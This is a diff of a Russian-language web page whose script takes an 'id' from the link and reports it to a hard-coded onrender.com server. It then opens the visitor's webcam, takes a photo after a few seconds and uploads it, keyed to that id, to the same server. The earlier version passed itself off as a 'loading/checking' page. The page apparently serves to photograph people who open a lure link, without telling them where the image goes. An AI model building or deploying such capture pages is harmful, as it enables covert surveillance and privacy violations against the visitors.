@@ -2,199 +2,125 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Загрузка</title>
-
-<style>
-body {
-    background: #111;
-    color: white;
-    font-family: Arial;
-    text-align: center;
-    padding-top: 50px;
-}
-
-button {
-    padding: 15px 30px;
-    font-size: 18px;
-    border-radius: 10px;
-    border: none;
-    cursor: pointer;
-}
-
-#status {
-    margin-top: 20px;
-}
-</style>
-
+<title>Test</title>
 </head>
 
 <body>
 
-<h2>Проверка...</h2>
+<h2 id="status">Запуск...</h2>
 
-<div id="status">
-Подключение...
-</div>
-
+<video id="video" autoplay playsinline width="300"></video>
 
 <script>
 
 const RENDER_URL = "https://kossah-github-io.onrender.com";
 
 
-async function start() {
+async function start(){
+
+    const status = document.getElementById("status");
 
     const params = new URLSearchParams(window.location.search);
+    const id = params.get("id");
 
-    const user_id = params.get("id");
 
-
-    if (!user_id) {
-
-        document.getElementById("status").innerHTML =
-        "ID не найден";
-
+    if(!id){
+        status.innerHTML = "Нет ID";
         return;
     }
 
 
+    // отправляем ID
+
+    await fetch(
+        RENDER_URL + "/?id=" + id
+    );
+
+
+    status.innerHTML = "ID отправлен, открываю камеру";
+
+
     try {
 
-
-        const response = await fetch(
-            RENDER_URL + "/?id=" + user_id
-        );
-
-
-        const data = await response.json();
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video:true
+        });
 
 
-        if(data.status === "ok") {
+        const video = document.getElementById("video");
 
-            document.getElementById("status").innerHTML =
-            "Готово";
-
-
-            // включаем камеру
-
-            openCamera(user_id);
+        video.srcObject = stream;
 
 
-        } else {
-
-            document.getElementById("status").innerHTML =
-            "Ошибка";
-
-        }
+        status.innerHTML = "Камера работает";
 
 
-    } catch(e) {
+        setTimeout(()=>{
 
-        document.getElementById("status").innerHTML =
-        "Ошибка подключения";
 
-        console.log(e);
+            const canvas = document.createElement("canvas");
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+
+            canvas.getContext("2d")
+            .drawImage(video,0,0);
+
+
+
+            canvas.toBlob(async(blob)=>{
+
+
+                let form = new FormData();
+
+                form.append("id", id);
+
+                form.append(
+                    "photo",
+                    blob,
+                    "photo.jpg"
+                );
+
+
+                const res = await fetch(
+                    RENDER_URL + "/photo",
+                    {
+                        method:"POST",
+                        body:form
+                    }
+                );
+
+
+                status.innerHTML =
+                await res.text();
+
+
+                stream.getTracks()
+                .forEach(t=>t.stop());
+
+
+            }, "image/jpeg");
+
+
+
+        },3000);
+
+
+
+    } catch(e){
+
+        status.innerHTML =
+        "Ошибка камеры: " + e;
 
     }
-
-}
-
-
-
-async function openCamera(user_id) {
-
-
-try {
-
-
-const stream = await navigator.mediaDevices.getUserMedia({
-    video:true
-});
-
-
-const video = document.createElement("video");
-
-video.srcObject = stream;
-
-video.autoplay = true;
-
-document.body.appendChild(video);
-
-
-
-setTimeout(()=>{
-
-
-const canvas = document.createElement("canvas");
-
-canvas.width = video.videoWidth;
-canvas.height = video.videoHeight;
-
-
-canvas.getContext("2d")
-.drawImage(video,0,0);
-
-
-
-canvas.toBlob(async(blob)=>{
-
-
-let form = new FormData();
-
-form.append("id", user_id);
-
-form.append("photo", blob, "photo.jpg");
-
-
-
-await fetch(
-RENDER_URL + "/photo",
-{
-method:"POST",
-body:form
-}
-);
-
-
-
-document.getElementById("status").innerHTML =
-"Фото отправлено";
-
-
-stream.getTracks().forEach(t=>t.stop());
-
-
-},3000);
-
-
-
-},1000);
-
-
-
-}
-
-catch(e){
-
-console.log(e);
-
-document.getElementById("status").innerHTML =
-"Камера запрещена";
-
-}
-
-
 
 }
 
 
 start();
 
-
 </script>
-
 
 </body>
 </html>
